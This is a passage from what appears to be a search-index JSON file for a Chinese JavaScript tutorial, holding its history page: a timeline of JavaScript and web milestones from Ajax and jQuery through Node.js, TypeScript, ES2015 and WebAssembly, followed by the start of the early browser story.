Application\uff09\u8fd9\u4e2a\u6982\u5ff5\u7684\u8bde\u751f\u3002\u7531\u4e8e Gmail \u662f\u57284\u67081\u65e5\u53d1\u5e03\u7684\uff0c\u5f88\u591a\u4eba\u8d77\u521d\u4ee5\u4e3a\u8fd9\u53ea\u662f\u4e00\u4e2a\u73a9\u7b11\u3002 2004\u5e74\uff0cDojo \u6846\u67b6\u8bde\u751f\uff0c\u4e3a\u4e0d\u540c\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u540c\u4e00\u63a5\u53e3\uff0c\u5e76\u4e3a\u4e3b\u8981\u529f\u80fd\u63d0\u4f9b\u4e86\u4fbf\u5229\u7684\u8c03\u7528\u65b9\u6cd5\u3002\u8fd9\u6807\u5fd7\u7740 JavaScript \u7f16\u7a0b\u6846\u67b6\u7684\u65f6\u4ee3\u5f00\u59cb\u6765\u4e34\u3002 2004\u5e74\uff0cWHATWG \u7ec4\u7ec7\u6210\u7acb\uff0c\u81f4\u529b\u4e8e\u52a0\u901f HTML \u8bed\u8a00\u7684\u6807\u51c6\u5316\u8fdb\u7a0b\u3002 2005\u5e74\uff0c\u82f9\u679c\u516c\u53f8\u5728 KHTML \u5f15\u64ce\u57fa\u7840\u4e0a\uff0c\u5efa\u7acb\u4e86 WebKit \u5f15\u64ce\u3002 2005\u5e74\uff0cAjax \u65b9\u6cd5\uff08Asynchronous JavaScript and XML\uff09\u6b63\u5f0f\u8bde\u751f\uff0cJesse James Garrett \u53d1\u660e\u4e86\u8fd9\u4e2a\u8bcd\u6c47\u3002\u5b83\u5f00\u59cb\u6d41\u884c\u7684\u6807\u5fd7\u662f\uff0c2\u6708\u4efd\u53d1\u5e03\u7684 Google Maps \u9879\u76ee\u5927\u91cf\u91c7\u7528\u8be5\u65b9\u6cd5\u3002\u5b83\u51e0\u4e4e\u6210\u4e86\u65b0\u4e00\u4ee3\u7f51\u7ad9\u7684\u6807\u51c6\u505a\u6cd5\uff0c\u4fc3\u6210\u4e86 Web 2.0\u65f6\u4ee3\u7684\u6765\u4e34\u3002 2005\u5e74\uff0cApache \u57fa\u91d1\u4f1a\u53d1\u5e03\u4e86 CouchDB \u6570\u636e\u5e93\u3002\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8e JSON \u683c\u5f0f\u7684\u6570\u636e\u5e93\uff0c\u53ef\u4ee5\u7528 JavaScript \u51fd\u6570\u5b9a\u4e49\u89c6\u56fe\u548c\u7d22\u5f15\u3002\u5b83\u5728\u672c\u8d28\u4e0a\u6709\u522b\u4e8e\u4f20\u7edf\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u6807\u8bc6\u7740 NoSQL \u7c7b\u578b\u7684\u6570\u636e\u5e93\u8bde\u751f\u3002 2006\u5e74\uff0cjQuery \u51fd\u6570\u5e93\u8bde\u751f\uff0c\u4f5c\u8005\u4e3aJohn Resig\u3002jQuery \u4e3a\u64cd\u4f5c\u7f51\u9875 DOM \u7ed3\u6784\u63d0\u4f9b\u4e86\u975e\u5e38\u5f3a\u5927\u6613\u7528\u7684\u63a5\u53e3\uff0c\u6210\u4e3a\u4e86\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u51fd\u6570\u5e93\uff0c\u5e76\u4e14\u8ba9 JavaScript \u8bed\u8a00\u7684\u5e94\u7528\u96be\u5ea6\u5927\u5927\u964d\u4f4e\uff0c\u63a8\u52a8\u4e86\u8fd9\u79cd\u8bed\u8a00\u7684\u6d41\u884c\u3002 2006\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u53d1\u5e03 IE 7\uff0c\u6807\u5fd7\u91cd\u65b0\u5f00\u59cb\u542f\u52a8\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u3002 2006\u5e74\uff0cGoogle\u63a8\u51fa Google Web Toolkit \u9879\u76ee\uff08\u7f29\u5199\u4e3a GWT\uff09\uff0c\u63d0\u4f9b Java \u7f16\u8bd1\u6210 JavaScript \u7684\u529f\u80fd\uff0c\u5f00\u521b\u4e86\u5c06\u5176\u4ed6\u8bed\u8a00\u8f6c\u4e3a JavaScript \u7684\u5148\u6cb3\u3002 2007\u5e74\uff0cWebkit \u5f15\u64ce\u5728 iPhone \u624b\u673a\u4e2d\u5f97\u5230\u90e8\u7f72\u3002\u5b83\u6700\u521d\u57fa\u4e8e KDE \u9879\u76ee\uff0c2003\u5e74\u82f9\u679c\u516c\u53f8\u9996\u5148\u91c7\u7528\uff0c2005\u5e74\u5f00\u6e90\u3002\u8fd9\u6807\u5fd7\u7740 JavaScript \u8bed\u8a00\u5f00\u59cb\u80fd\u5728\u624b\u673a\u4e2d\u4f7f\u7528\u4e86\uff0c\u610f\u5473\u7740\u6709\u53ef\u80fd\u5199\u51fa\u5728\u684c\u9762\u7535\u8111\u548c\u624b\u673a\u4e2d\u90fd\u80fd\u4f7f\u7528\u7684\u7a0b\u5e8f\u3002 2007\u5e74\uff0cDouglas Crockford \u53d1\u8868\u4e86\u540d\u4e3a\u300aJavaScript: The good parts\u300b\u7684\u6f14\u8bb2\uff0c\u6b21\u5e74\u7531 O'Reilly \u51fa\u7248\u793e\u51fa\u7248\u3002\u8fd9\u6807\u5fd7\u7740\u8f6f\u4ef6\u884c\u4e1a\u5f00\u59cb\u4e25\u8083\u5bf9\u5f85 JavaScript \u8bed\u8a00\uff0c\u5bf9\u5b83\u7684\u8bed\u6cd5\u5f00\u59cb\u91cd\u65b0\u8ba4\u8bc6\u3002 2008\u5e74\uff0cV8 \u7f16\u8bd1\u5668\u8bde\u751f\u3002\u8fd9\u662f Google \u516c\u53f8\u4e3a Chrome \u6d4f\u89c8\u5668\u800c\u5f00\u53d1\u7684\uff0c\u5b83\u7684\u7279\u70b9\u662f\u8ba9 JavaScript \u7684\u8fd0\u884c\u53d8\u5f97\u975e\u5e38\u5feb\u3002\u5b83\u63d0\u9ad8\u4e86 JavaScript \u7684\u6027\u80fd\uff0c\u63a8\u52a8\u4e86\u8bed\u6cd5\u7684\u6539\u8fdb\u548c\u6807\u51c6\u5316\uff0c\u6539\u53d8\u5916\u754c\u5bf9 JavaScript \u7684\u4e0d\u4f73\u5370\u8c61\u3002\u540c\u65f6\uff0cV8 \u662f\u5f00\u6e90\u7684\uff0c\u4efb\u4f55\u4eba\u60f3\u8981\u4e00\u79cd\u5feb\u901f\u7684\u5d4c\u5165\u5f0f\u811a\u672c\u8bed\u8a00\uff0c\u90fd\u53ef\u4ee5\u91c7\u7528 V8\uff0c\u8fd9\u62d3\u5c55\u4e86 JavaScript \u7684\u5e94\u7528\u9886\u57df\u3002 2009\u5e74\uff0cNode.js \u9879\u76ee\u8bde\u751f\uff0c\u521b\u59cb\u4eba\u4e3a Ryan Dahl\uff0c\u5b83\u6807\u5fd7\u7740 JavaScript \u53ef\u4ee5\u7528\u4e8e\u670d\u52a1\u5668\u7aef\u7f16\u7a0b\uff0c\u4ece\u6b64\u7f51\u7ad9\u7684\u524d\u7aef\u548c\u540e\u7aef\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u79cd\u8bed\u8a00\u5f00\u53d1\u3002\u5e76\u4e14\uff0cNode.js \u53ef\u4ee5\u627f\u53d7\u5f88\u5927\u7684\u5e76\u53d1\u6d41\u91cf\uff0c\u4f7f\u5f97\u5f00\u53d1\u67d0\u4e9b\u4e92\u8054\u7f51\u5927\u89c4\u6a21\u7684\u5b9e\u65f6\u5e94\u7528\u53d8\u5f97\u5bb9\u6613\u3002 2009\u5e74\uff0cJeremy Ashkenas \u53d1\u5e03\u4e86 CoffeeScript \u7684\u6700\u521d\u7248\u672c\u3002CoffeeScript \u53ef\u4ee5\u88ab\u8f6c\u6362\u4e3a JavaScript \u8fd0\u884c\uff0c\u4f46\u662f\u8bed\u6cd5\u8981\u6bd4 JavaScript \u7b80\u6d01\u3002\u8fd9\u5f00\u542f\u4e86\u5176\u4ed6\u8bed\u8a00\u8f6c\u4e3a JavaScript \u7684\u98ce\u6f6e\u3002 2009\u5e74\uff0cPhoneGap \u9879\u76ee\u8bde\u751f\uff0c\u5b83\u5c06 HTML5 \u548c JavaScript \u5f15\u5165\u79fb\u52a8\u8bbe\u5907\u7684\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\uff0c\u4e3b\u8981\u9488\u5bf9 iOS \u548c Android \u5e73\u53f0\uff0c\u4f7f\u5f97 JavaScript \u53ef\u4ee5\u7528\u4e8e\u8de8\u5e73\u53f0\u7684\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u3002 2009\uff0cGoogle \u53d1\u5e03 Chrome OS\uff0c\u53f7\u79f0\u662f\u4ee5\u6d4f\u89c8\u5668\u4e3a\u57fa\u7840\u53d1\u5c55\u6210\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5141\u8bb8\u76f4\u63a5\u4f7f\u7528 JavaScript \u7f16\u5199\u5e94\u7528\u7a0b\u5e8f\u3002\u7c7b\u4f3c\u7684\u9879\u76ee\u8fd8\u6709 Mozilla \u7684 Firefox OS\u3002 2010\u5e74\uff0c\u4e09\u4e2a\u91cd\u8981\u7684\u9879\u76ee\u8bde\u751f\uff0c\u5206\u522b\u662f NPM\u3001BackboneJS \u548c RequireJS\uff0c\u6807\u5fd7\u7740 JavaScript \u8fdb\u5165\u6a21\u5757\u5316\u5f00\u53d1\u7684\u65f6\u4ee3\u3002 2011\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u53d1\u5e03 Windows 8\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5c06 JavaScript \u4f5c\u4e3a\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u8bed\u8a00\u4e4b\u4e00\uff0c\u76f4\u63a5\u63d0\u4f9b\u7cfb\u7edf\u652f\u6301\u3002 2011\u5e74\uff0cGoogle \u53d1\u5e03\u4e86 Dart \u8bed\u8a00\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u7ed3\u675f JavaScript \u8bed\u8a00\u5728\u6d4f\u89c8\u5668\u4e2d\u7684\u5784\u65ad\uff0c\u63d0\u4f9b\u66f4\u5408\u7406\u3001\u66f4\u5f3a\u5927\u7684\u8bed\u6cd5\u548c\u529f\u80fd\u3002Chromium\u6d4f\u89c8\u5668\u6709\u5185\u7f6e\u7684 Dart \u865a\u62df\u673a\uff0c\u53ef\u4ee5\u8fd0\u884c Dart \u7a0b\u5e8f\uff0c\u4f46 Dart \u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210 JavaScript \u7a0b\u5e8f\u8fd0\u884c\u3002 2011\u5e74\uff0c\u5fae\u8f6f\u5de5\u7a0b\u5e08 Scott Hanselman \u63d0\u51fa\uff0cJavaScript \u5c06\u662f\u4e92\u8054\u7f51\u7684\u6c47\u7f16\u8bed\u8a00\u3002\u56e0\u4e3a\u5b83\u65e0\u6240\u4e0d\u5728\uff0c\u800c\u4e14\u6b63\u5728\u53d8\u5f97\u8d8a\u6765\u8d8a\u5feb\u3002\u5176\u4ed6\u8bed\u8a00\u7684\u7a0b\u5e8f\u53ef\u4ee5\u88ab\u8f6c\u6210 JavaScript \u8bed\u8a00\uff0c\u7136\u540e\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002 2012\u5e74\uff0c\u5355\u9875\u9762\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\uff08single-page app framework\uff09\u5f00\u59cb\u5d1b\u8d77\uff0cAngularJS \u9879\u76ee\u548c Ember \u9879\u76ee\u90fd\u53d1\u5e03\u4e861.0\u7248\u672c\u3002 2012\u5e74\uff0c\u5fae\u8f6f\u53d1\u5e03 TypeScript \u8bed\u8a00\u3002\u8be5\u8bed\u8a00\u88ab\u8bbe\u8ba1\u6210 JavaScript \u7684\u8d85\u96c6\uff0c\u8fd9\u610f\u5473\u7740\u6240\u6709 JavaScript \u7a0b\u5e8f\uff0c\u90fd\u53ef\u4ee5\u4e0d\u7ecf\u4fee\u6539\u5730\u5728 TypeScript \u4e2d\u8fd0\u884c\u3002\u540c\u65f6\uff0cTypeScript \u6dfb\u52a0\u4e86\u5f88\u591a\u65b0\u7684\u8bed\u6cd5\u7279\u6027\uff0c\u4e3b\u8981\u76ee\u7684\u662f\u4e3a\u4e86\u5f00\u53d1\u5927\u578b\u7a0b\u5e8f\uff0c\u7136\u540e\u8fd8\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210 JavaScript \u8fd0\u884c\u3002 2012\u5e74\uff0cMozilla \u57fa\u91d1\u4f1a\u63d0\u51fa asm.js \u89c4\u683c\u3002asm.js \u662f JavaScript \u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u6240\u6709\u7b26\u5408 asm.js \u7684\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\uff0c\u5b83\u7684\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u8bed\u6cd5\u6709\u4e25\u683c\u9650\u5b9a\uff0c\u53ef\u4ee5\u88ab\u5feb\u901f\u7f16\u8bd1\u6210\u6027\u80fd\u826f\u597d\u7684\u673a\u5668\u7801\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u7ed9\u5176\u4ed6\u8bed\u8a00\u63d0\u4f9b\u4e00\u4e2a\u7f16\u8bd1\u89c4\u8303\uff0c\u4f7f\u5176\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210\u9ad8\u6548\u7684 JavaScript \u4ee3\u7801\u3002\u540c\u65f6\uff0cMozilla \u57fa\u91d1\u4f1a\u8fd8\u53d1\u8d77\u4e86 Emscripten \u9879\u76ee\uff0c\u76ee\u6807\u5c31\u662f\u63d0\u4f9b\u4e00\u4e2a\u8de8\u8bed\u8a00\u7684\u7f16\u8bd1\u5668\uff0c\u80fd\u591f\u5c06 LLVM \u7684\u4f4d\u4ee3\u7801\uff08bitcode\uff09\u8f6c\u4e3a JavaScript \u4ee3\u7801\uff0c\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002\u56e0\u4e3a\u5927\u90e8\u5206 LLVM \u4f4d\u4ee3\u7801\u90fd\u662f\u4ece C / C++ \u8bed\u8a00\u751f\u6210\u7684\uff0c\u8fd9\u610f\u5473\u7740 C / C++ \u5c06\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c\u3002\u6b64\u5916\uff0cMozilla \u65d7\u4e0b\u8fd8\u6709 LLJS \uff08\u5c06 JavaScript \u8f6c\u4e3a C \u4ee3\u7801\uff09\u9879\u76ee\u548c River Trail \uff08\u4e00\u4e2a\u7528\u4e8e\u591a\u6838\u5fc3\u5904\u7406\u5668\u7684 ECMAScript \u6269\u5c55\uff09\u9879\u76ee\u3002\u76ee\u524d\uff0c\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210 JavaScript \u7684 \u8bed\u8a00\u5217\u8868 \uff0c\u5171\u6709\u5c06\u8fd140\u79cd\u8bed\u8a00\u3002 2013\u5e74\uff0cMozilla \u57fa\u91d1\u4f1a\u53d1\u5e03\u624b\u673a\u64cd\u4f5c\u7cfb\u7edf Firefox OS\uff0c\u8be5\u64cd\u4f5c\u7cfb\u7edf\u7684\u6574\u4e2a\u7528\u6237\u754c\u9762\u90fd\u4f7f\u7528 JavaScript\u3002 2013\u5e74\uff0cECMA \u6b63\u5f0f\u63a8\u51fa JSON \u7684 \u56fd\u9645\u6807\u51c6 \uff0c\u8fd9\u610f\u5473\u7740 JSON \u683c\u5f0f\u5df2\u7ecf\u53d8\u5f97\u4e0e XML \u683c\u5f0f\u4e00\u6837\u91cd\u8981\u548c\u6b63\u5f0f\u4e86\u3002 2013\u5e745\u6708\uff0cFacebook \u53d1\u5e03 UI \u6846\u67b6\u5e93 React\uff0c\u5f15\u5165\u4e86\u65b0\u7684 JSX \u8bed\u6cd5\uff0c\u4f7f\u5f97 UI \u5c42\u53ef\u4ee5\u7528\u7ec4\u4ef6\u5f00\u53d1\uff0c\u540c\u65f6\u5f15\u5165\u4e86\u7f51\u9875\u5e94\u7528\u662f\u72b6\u6001\u673a\u7684\u6982\u5ff5\u3002 2014\u5e74\uff0c\u5fae\u8f6f\u63a8\u51fa JavaScript \u7684 Windows \u5e93 WinJS\uff0c\u6807\u5fd7\u5fae\u8f6f\u516c\u53f8\u5168\u9762\u652f\u6301 JavaScript \u4e0e Windows \u64cd\u4f5c\u7cfb\u7edf\u7684\u878d\u5408\u3002 2014\u5e7411\u6708\uff0c\u7531\u4e8e\u5bf9 Joyent \u516c\u53f8\u5784\u65ad Node \u9879\u76ee\u3001\u4ee5\u53ca\u8be5\u9879\u76ee\u8fdb\u5c55\u7f13\u6162\u7684\u4e0d\u6ee1\uff0c\u4e00\u90e8\u5206\u6838\u5fc3\u5f00\u53d1\u8005\u79bb\u5f00\u4e86 Node.js\uff0c\u521b\u9020\u4e86 io.js \u9879\u76ee\uff0c\u8fd9\u662f\u4e00\u4e2a\u66f4\u5f00\u653e\u3001\u66f4\u65b0\u66f4\u9891\u7e41\u7684 Node.js \u7248\u672c\uff0c\u5f88\u77ed\u65f6\u95f4\u5185\u5c31\u53d1\u5e03\u5230\u4e862.0\u7248\u3002\u4e09\u4e2a\u6708\u540e\uff0cJoyent \u516c\u53f8\u5ba3\u5e03\u653e\u5f03\u5bf9 Node \u9879\u76ee\u7684\u63a7\u5236\uff0c\u5c06\u5176\u8f6c\u4ea4\u7ed9\u65b0\u6210\u7acb\u7684\u5f00\u653e\u6027\u8d28\u7684 Node \u57fa\u91d1\u4f1a\u3002\u968f\u540e\uff0cio.js \u9879\u76ee\u5ba3\u5e03\u56de\u5f52 Node\uff0c\u4e24\u4e2a\u7248\u672c\u5c06\u5408\u5e76\u3002 2015\u5e743\u6708\uff0cFacebook \u516c\u53f8\u53d1\u5e03\u4e86 React Native \u9879\u76ee\uff0c\u5c06 React \u6846\u67b6\u79fb\u690d\u5230\u4e86\u624b\u673a\u7aef\uff0c\u53ef\u4ee5\u7528\u6765\u5f00\u53d1\u624b\u673a App\u3002\u5b83\u4f1a\u5c06 JavaScript \u4ee3\u7801\u8f6c\u4e3a iOS \u5e73\u53f0\u7684 Objective-C \u4ee3\u7801\uff0c\u6216\u8005 Android \u5e73\u53f0\u7684 Java \u4ee3\u7801\uff0c\u4ece\u800c\u4e3a JavaScript \u8bed\u8a00\u5f00\u53d1\u9ad8\u6027\u80fd\u7684\u539f\u751f App \u6253\u5f00\u4e86\u4e00\u6761\u9053\u8def\u3002 2015\u5e744\u6708\uff0cAngular \u6846\u67b6\u5ba3\u5e03\uff0c2.0 \u7248\u5c06\u57fa\u4e8e\u5fae\u8f6f\u516c\u53f8\u7684TypeScript\u8bed\u8a00\u5f00\u53d1\uff0c\u8fd9\u7b49\u4e8e\u4e3a JavaScript \u8bed\u8a00\u5f15\u5165\u4e86\u5f3a\u7c7b\u578b\u3002 2015\u5e745\u6708\uff0cNode \u6a21\u5757\u7ba1\u7406\u5668 NPM \u8d85\u8d8a CPAN\uff0c\u6807\u5fd7\u7740 JavaScript \u6210\u4e3a\u4e16\u754c\u4e0a\u8f6f\u4ef6\u6a21\u5757\u6700\u591a\u7684\u8bed\u8a00\u3002 2015\u5e745\u6708\uff0cGoogle \u516c\u53f8\u7684 Polymer \u6846\u67b6\u53d1\u5e031.0\u7248\u3002\u8be5\u9879\u76ee\u7684\u76ee\u6807\u662f\u751f\u4ea7\u73af\u5883\u53ef\u4ee5\u4f7f\u7528 WebComponent \u7ec4\u4ef6\uff0c\u5982\u679c\u80fd\u591f\u8fbe\u5230\u76ee\u6807\uff0cWeb \u5f00\u53d1\u5c06\u8fdb\u5165\u4e00\u4e2a\u5168\u65b0\u7684\u4ee5\u7ec4\u4ef6\u4e3a\u5f00\u53d1\u57fa\u7840\u7684\u9636\u6bb5\u3002 2015\u5e746\u6708\uff0cECMA \u6807\u51c6\u5316\u7ec4\u7ec7\u6b63\u5f0f\u6279\u51c6\u4e86 ECMAScript 6 \u8bed\u8a00\u6807\u51c6\uff0c\u5b9a\u540d\u4e3a\u300aECMAScript 2015 \u6807\u51c6\u300b\u3002JavaScript \u8bed\u8a00\u6b63\u5f0f\u8fdb\u5165\u4e86\u4e0b\u4e00\u4e2a\u9636\u6bb5\uff0c\u6210\u4e3a\u4e00\u79cd\u4f01\u4e1a\u7ea7\u7684\u3001\u5f00\u53d1\u5927\u89c4\u6a21\u5e94\u7528\u7684\u8bed\u8a00\u3002\u8fd9\u4e2a\u6807\u51c6\u4ece\u63d0\u51fa\u5230\u6279\u51c6\uff0c\u5386\u65f610\u5e74\uff0c\u800c JavaScript \u8bed\u8a00\u4ece\u8bde\u751f\u81f3\u4eca\u4e5f\u5df2\u7ecf20\u5e74\u4e86\u3002 2015\u5e746\u6708\uff0cMozilla \u5728 asm.js \u7684\u57fa\u7840\u4e0a\u53d1\u5e03 WebAssembly \u9879\u76ee\u3002\u8fd9\u662f\u4e00\u79cd JavaScript \u5f15\u64ce\u7684\u4e2d\u95f4\u7801\u683c\u5f0f\uff0c\u5168\u90e8\u90fd\u662f\u4e8c\u8fdb\u5236\uff0c\u7c7b\u4f3c\u4e8e Java \u7684\u5b57\u8282\u7801\uff0c\u6709\u5229\u4e8e\u79fb\u52a8\u8bbe\u5907\u52a0\u8f7d JavaScript \u811a\u672c\uff0c\u6267\u884c\u901f\u5ea6\u63d0\u9ad8\u4e86 20+ \u500d\u3002\u8fd9\u610f\u5473\u7740\u5c06\u6765\u7684\u8f6f\u4ef6\uff0c\u4f1a\u53d1\u5e03 JavaScript \u4e8c\u8fdb\u5236\u5305\u3002 2016\u5e746\u6708\uff0c\u300aECMAScript 2016 \u6807\u51c6\u300b\u53d1\u5e03\u3002\u4e0e\u524d\u4e00\u5e74\u53d1\u5e03\u7684\u7248\u672c\u76f8\u6bd4\uff0c\u5b83\u53ea\u589e\u52a0\u4e86\u4e24\u4e2a\u8f83\u5c0f\u7684\u7279\u6027\u3002 2017\u5e746\u6708\uff0c\u300aECMAScript 2017 \u6807\u51c6\u300b\u53d1\u5e03\uff0c\u6b63\u5f0f\u5f15\u5165\u4e86 async \u51fd\u6570\uff0c\u4f7f\u5f97\u5f02\u6b65\u64cd\u4f5c\u7684\u5199\u6cd5\u51fa\u73b0\u4e86\u6839\u672c\u7684\u53d8\u5316\u3002 2017\u5e7411\u6708\uff0c\u6240\u6709\u4e3b\u6d41\u6d4f\u89c8\u5668\u5168\u90e8\u652f\u6301 WebAssembly\uff0c\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u8bed\u8a00\u90fd\u53ef\u4ee5\u7f16\u8bd1\u6210 JavaScript\uff0c\u5728\u6d4f\u89c8\u5668\u8fd0\u884c\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, The Past, Present, and Future of JavaScript John Dalziel, The race for speed part 4: The future for JavaScript Axel Rauschmayer, Basic JavaScript for the impatient programmer resin.io, Happy 18 th Birthday JavaScript! A look at an unlikely past and bright future","title":"\u5386\u53f2"},{"location":"basic/history/#javascript","text":"","title":"JavaScript \u8bed\u8a00\u7684\u5386\u53f2"},{"location":"basic/history/#_1","text":"JavaScript \u56e0\u4e3a\u4e92\u8054\u7f51\u800c\u751f\uff0c\u7d27\u8ddf\u7740\u6d4f\u89c8\u5668\u7684\u51fa\u73b0\u800c\u95ee\u4e16\u3002\u56de\u987e\u5b83\u7684\u5386\u53f2\uff0c\u5c31\u8981\u4ece\u6d4f\u89c8\u5668\u7684\u5386\u53f2\u8bb2\u8d77\u3002 1990\u5e74\u5e95\uff0c\u6b27\u6d32\u6838\u80fd\u7814\u7a76\u7ec4\u7ec7\uff08CERN\uff09\u79d1\u5b66\u5bb6 Tim Berners-Lee\uff0c\u5728\u5168\u4e16\u754c\u6700\u5927\u7684\u7535\u8111\u7f51\u7edc\u2014\u2014\u4e92\u8054\u7f51\u7684\u57fa\u7840\u4e0a\uff0c\u53d1\u660e\u4e86\u4e07\u7ef4\u7f51\uff08World Wide Web\uff09\uff0c\u4ece\u6b64\u53ef\u4ee5\u5728\u7f51\u4e0a\u6d4f\u89c8\u7f51\u9875\u6587\u4ef6\u3002\u6700\u65e9\u7684\u7f51\u9875\u53ea\u80fd\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ec8\u7aef\u91cc\u6d4f\u89c8\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u80fd\u4f7f\u7528\u547d\u4ee4\u884c\u64cd\u4f5c\uff0c\u7f51\u9875\u90fd\u662f\u5728\u5b57\u7b26\u7a97\u53e3\u4e2d\u663e\u793a\uff0c\u8fd9\u5f53\u7136\u975e\u5e38\u4e0d\u65b9\u4fbf\u3002 1992\u5e74\u5e95\uff0c\u7f8e\u56fd\u56fd\u5bb6\u8d85\u7ea7\u7535\u8111\u5e94\u7528\u4e2d\u5fc3\uff08NCSA\uff09\u5f00\u59cb\u5f00\u53d1\u4e00\u4e2a\u72ec\u7acb\u7684\u6d4f\u89c8\u5668\uff0c\u53eb\u505a Mosaic\u3002\u8fd9\u662f\u4eba\u7c7b\u5386\u53f2\u4e0a\u7b2c\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0c\u4ece\u6b64\u7f51\u9875\u53ef\u4ee5\u5728\u56fe\u5f62\u754c\u9762\u7684\u7a97\u53e3\u6d4f\u89c8\u3002 1994\u5e7410\u6708\uff0cNCSA \u7684\u4e00\u4e2a\u4e3b\u8981\u7a0b\u5e8f\u5458 Marc Andreessen \u8054\u5408\u98ce\u9669\u6295\u8d44\u5bb6 Jim Clark\uff0c\u6210\u7acb\u4e86 Mosaic \u901a\u4fe1\u516c\u53f8\uff08Mosaic Communications\uff09\uff0c\u4e0d\u4e45\u540e\u6539\u540d\u4e3a Netscape\u3002\u8fd9\u5bb6\u516c\u53f8\u7684\u65b9\u5411\uff0c\u5c31\u662f\u5728 Mosaic \u7684\u57fa\u7840\u4e0a\uff0c\u5f00\u53d1\u9762\u5411\u666e\u901a\u7528\u6237\u7684\u65b0\u4e00\u4ee3\u7684\u6d4f\u89c8\u5668 Netscape Navigator\u3002 1994\u5e7412\u6708\uff0cNavigator \u53d1\u5e03\u4e861.0\u7248\uff0c\u5e02\u573a\u4efd\u989d\u4e00\u4e3e\u8d85\u8fc790%\u3002 Netscape \u516c\u53f8\u5f88\u5feb\u53d1\u73b0\uff0cNavigator \u6d4f\u89c8\u5668\u9700\u8981\u4e00\u79cd\u53ef\u4ee5\u5d4c\u5165\u7f51\u9875\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7528\u6765\u63a7\u5236\u6d4f\u89c8\u5668\u884c\u4e3a\u3002\u5f53\u65f6\uff0c\u7f51\u901f\u5f88\u6162\u800c\u4e14\u4e0a\u7f51\u8d39\u5f88\u8d35\uff0c\u6709\u4e9b\u64cd\u4f5c\u4e0d\u5b9c\u5728\u670d\u52a1\u5668\u7aef\u5b8c\u6210\u3002\u6bd4\u5982\uff0c\u5982\u679c\u7528\u6237\u5fd8\u8bb0\u586b\u5199\u201c\u7528\u6237\u540d\u201d\uff0c\u5c31\u70b9\u4e86\u201c\u53d1\u9001\u201d\u6309\u94ae\uff0c\u5230\u670d\u52a1\u5668\u518d\u53d1\u73b0\u8fd9\u4e00\u70b9\u5c31\u6709\u70b9\u592a\u665a\u4e86\uff0c\u6700\u597d\u80fd\u5728\u7528\u6237\u53d1\u51fa\u6570\u636e\u4e4b\u524d\uff0c\u5c31\u544a\u8bc9\u7528\u6237\u201c\u8bf7\u586b\u5199\u7528\u6237\u540d\u201d\u3002\u8fd9\u5c31\u9700\u8981\u5728\u7f51\u9875\u4e2d\u5d4c\u5165\u5c0f\u7a0b\u5e8f\uff0c\u8ba9\u6d4f\u89c8\u5668\u68c0\u67e5\u6bcf\u4e00\u680f\u662f\u5426\u90fd\u586b\u5199\u4e86\u3002 \u7ba1\u7406\u5c42\u5bf9\u8fd9\u79cd\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u7684\u8bbe\u60f3\u662f\uff1a\u529f\u80fd\u4e0d\u9700\u8981\u592a\u5f3a\uff0c\u8bed\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u5bb9\u6613\u5b66\u4e60\u548c\u90e8\u7f72\u3002\u90a3\u4e00\u5e74\uff0c\u6b63\u9022 Sun \u516c\u53f8\u7684 Java \u8bed\u8a00\u95ee\u4e16\uff0c\u5e02\u573a\u63a8\u5e7f\u6d3b\u52a8\u975e\u5e38\u6210\u529f\u3002Netscape \u516c\u53f8\u51b3\u5b9a\u4e0e Sun \u516c\u53f8\u5408\u4f5c\uff0c\u6d4f\u89c8\u5668\u652f\u6301\u5d4c\u5165 Java \u5c0f\u7a0b\u5e8f\uff08\u540e\u6765\u79f0\u4e3a Java applet\uff09\u3002\u4f46\u662f\uff0c\u6d4f\u89c8\u5668\u811a\u672c\u8bed\u8a00\u662f\u5426\u5c31\u9009\u7528 Java\uff0c\u5219\u5b58\u5728\u4e89\u8bba\u3002\u540e\u6765\uff0c\u8fd8\u662f\u51b3\u5b9a\u4e0d\u4f7f\u7528 Java\uff0c\u56e0\u4e3a\u7f51\u9875\u5c0f\u7a0b\u5e8f\u4e0d\u9700\u8981 Java \u8fd9\u4e48\u201c\u91cd\u201d\u7684\u8bed\u6cd5\u3002\u4f46\u662f\uff0c\u540c\u65f6\u4e5f\u51b3\u5b9a\u811a\u672c\u8bed\u8a00\u7684\u8bed\u6cd5\u8981\u63a5\u8fd1 Java\uff0c\u5e76\u4e14\u53ef\u4ee5\u652f\u6301 Java 